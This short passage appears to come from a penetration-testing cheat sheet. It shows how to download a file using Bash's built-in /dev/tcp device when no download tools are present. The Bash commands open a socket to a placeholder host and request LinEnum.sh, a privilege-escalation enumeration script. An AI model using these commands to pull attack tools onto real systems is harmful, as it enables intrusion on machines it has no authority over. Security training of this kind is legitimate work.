----
There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver
```bash
exec 3<>/dev/tcp/<ip>/<port>
```

#### HTTP GET Request
```bash
echo  -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response
```bash
cat <&3
```

